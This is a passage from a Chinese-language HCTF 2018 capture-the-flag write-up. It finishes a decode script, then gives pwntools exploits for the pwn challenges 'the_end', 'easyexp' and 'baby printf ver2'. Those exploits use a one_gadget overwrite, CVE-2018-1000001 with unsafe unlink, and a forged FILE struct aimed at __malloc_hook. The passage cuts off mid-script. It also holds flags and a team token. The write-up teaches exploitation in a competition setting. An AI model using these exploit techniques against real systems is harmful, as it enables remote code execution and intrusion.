                    str_decode += '['
                elif cmd == 48:
                    str_decode += ']'
                elif cmd == 49:
                    str_decode += '\\'
                elif cmd == 51:
                    str_decode += ';'
                elif cmd == 52:
                    str_decode += "'"
                elif cmd == 53:
                    str_decode += '`'
                elif cmd == 54:
                    str_decode += ','
                elif cmd == 55:
                    str_decode += '.'
                elif cmd == 56:
                    str_decode += '/'
                else:
                    print('!!!')
            elif buffer[1] == '2':
                if 4 '
                elif cmd == 56:
                    str_decode += '?'
                else:
                    print('!!!')
            else:
                print('!!!')
                print(buffer)
    print(str_decode)
> flag:hctf{m4lb0lGe}
# Pwn
## the_end
有点像0ctf2017-left:
exit会调用dl_fini，里面有一个call，可以去修改ld.so 附近的一个地方，直接填one_gadget get shell
    from pwn import *
    debug=0
    context.log_level='debug'
    e=ELF('./libc-2.23.so')
    if debug:
        p=process('./the_end')
        #p=process('',env={'LD_PRELOAD':'./libc.so'})
        gdb.attach(p)
    else:
        p=remote('150.109.44.250', 20002)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    if not debug:
        ru('Input your token:')
        se('uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n')
    ru('here is a gift ')
    base=int(ru(',')[:-1],16)-e.symbols['sleep']
    call=base+0x5F0F48
    one_gadget=p64(base+0xf02a4)
    for i in range(5):
        se(p64(call+i))
        se(one_gadget[i])
    print(hex(base))
    p.sendline('cat flag>&0')
    p.interactive()
> flag:hctf{706a09271a59b9e2db1a2d0cf1e40e2073c0a886197f6f3cf3b5d2114fc600d7}
## easyexp
clone 了一个子线程，mount 了tmpfs到/tmp那里，再chdir到mount的这个tmp那里，然后sleep 1000000秒之后 结束  
设子线程pid=cpid  
主线程chdir到 /proc/cpid/cwd/ ，然后在里面创建文件夹和假flag  
ls没有限制 / 和 .. 所以可以看所有目录的情况
根据hint提示，要用libc-2.23_9 ，我虚拟机的是libc-2.23_10，然后去找了下change log
  *     * SECURITY UPDATE: Buffer underflow in realpath()
  *     * debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:
  * Make getcwd(3) fail if it cannot obtain an absolute path
  *     * CVE-2018-1000001
发现realpath有一个overflow
所以大概关键就在canonicalize_file_name这个函数这里
就是CVE–2018-1000001
（之前就想拿这个CVE来出题........可惜怕被当成kernel题就没敢出  
（没复现CVE，现在要去看一遍源码.......
一开始输入名字的时候输入(unreachable)，然后在里面创建一个tmp文件，这样就可以绕过realpath 里面的一个检查
利用的话是改chunk size，unsafe unlink，再拿到任意读写，get shell（话说好久没碰到要用unsafe
unlink的题，都生疏了..........
payload 如下
    from pwn import *
    debug=0
    context.log_level='debug'
    e=ELF('./libc-2.23_9.so')
    if debug:
        #p=process('./easyexp')
        p=process('./easyexp',env={'LD_PRELOAD':'./libc-2.23_9.so'})
        gdb.attach(p)
    else:
        p=remote('150.109.46.159', 20004)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def sl(x):
        p.sendline(x)
    def mkfile(name,content):
        sl('mkfile '+name)
        ru('write something:')
        sl(content)
        ru('$')
    def cat(name):
        sl('cat '+name)
        return ru('$')
    if not debug:
        ru('Input your token:')
        sl('uvm73jg2AFMECo71DIZRZh39MRqFOI2w')
    ru("input your home's name: ")
    se('(unreachable)\n')
    ru('$')
    mkfile('(unreachable)/tmp','a'*0x16+'/')
    mkfile('2','a'*0x27)
    mkfile('3','a'*0x37)
    mkfile('3',p64(0x21)*4)
    sl('mkdir ../../../../a\x41')
    cat('(unreachable)/tmp')
    mkfile('4','a'*0x37)
    mkfile('4',p64(0)+p64(0x21)+p64(0x6031e0-0x18+1)+p64(0x6031e0-0x10)+p64(0x20)+p64(0x41))
    mkfile('5','1'*0x27)
    cat('4')
    mkfile('6','a'*0x37)
    mkfile('6',p64(0x21)*6)
    mkfile('7','a'*0x37)
    mkfile('7',p64(0x21)*6)
    cat('6')
    mkfile('77','a'*0x27)
    mkfile('77',p64(0x21)*4)
    mkfile('4',p64(0)+p64(0x21)+p64(0x6031e0-0x18)+p64(0x6031e0-0x10)+p64(0x20)+p64(0x90))
    mkfile('8','/bin/sh')
    mkfile('4','a'*0x18+p64(0x603180)+p32(0x200)[:2])
    mkfile('4',p64(0x603018)+p32(0x200)[:2])
    data=cat('77')
    base=u64(data[1:7]+'\x00\x00')-e.symbols['free']
    system = base+e.symbols['system']
    mkfile('77',p64(system)[:6])
    cat('4')
    sl('mkfile 99')
    print(hex(base))
    p.interactive()
> flag:hctf{53e3b00dc29b152d1740f042ae4efce199785f7acaa062c21d600e67f811d276}
## baby printf ver2
首先利用任意读把libc地址泄漏出来，  
然后任意写，写__malloc_hook  
再输入%n，报错，报错的时候会调用malloc，get shell
    from pwn import *
    debug=0
    context.log_level='debug'
    e=ELF('./libc64.so')
    if debug:
        #p=process('./babyprintf_ver2')
        p=process('./babyprintf_ver2',env={'LD_PRELOAD':'./libc64.so'})
        gdb.attach(p)
    else:
        p=remote('150.109.44.250', 20005)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    if not debug:
        ru('Input your token:')
        se('uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n')
    ru('So I change the buffer location to ')
    buffer=int(ru('\n'),16)
    pbase=buffer-0x202010
    ru('Have fun!')
    file = p64(0xfbad2887) + p64(pbase+0x201FB0)
    file+= p64(buffer+0xf0) +p64(buffer+0xf0)
    file+= p64(buffer+0xf0) +p64(buffer+0xf8)
    file+= p64(buffer+0xf0) +p64(pbase+0x201FB0)
    file+= p64(pbase+0x201FB0+8) +p64(0)
    file+= p64(0) +p64(0)
    file+= p64(0) +p64(0)
    file+= p64(1) +p64(0xffffffffffffffff)
    file+= p64(0) +p64(buffer+0x200)
    file+= p64(0xffffffffffffffff) +p64(0)
    file+= p64(buffer+0x210) +p64(0)